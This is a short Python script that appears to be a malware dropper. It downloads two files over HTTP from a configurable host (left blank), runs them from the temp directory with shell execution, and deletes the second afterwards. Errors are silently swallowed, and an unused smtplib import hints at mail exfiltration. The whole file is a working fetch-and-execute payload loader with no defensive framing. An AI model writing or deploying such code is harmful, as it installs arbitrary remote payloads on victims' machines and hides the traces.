import subprocess, smtplib, requests, os, tempfile, sys


def dl(url):
    get = requests.get(url)
    fileName = url.split('/')
    with open(fileName[-1],'wb') as of:
        of.write(get.content)


def run(ip,file1,file2):
    tempDir = tempfile.gettempdir()
    os.chdir(tempDir)
    dl(f'http://{ip}/{file1}') 
    subprocess.Popen(file1,shell=True)
    dl(f'http://{ip}/{file2}') 
    subprocess.call(file2,shell=True)
    os.remove(file2)



ip = ''
file1 = ''
file2 = ''



try:
    run(ip,file1,file2)
except: 
    sys.exit()








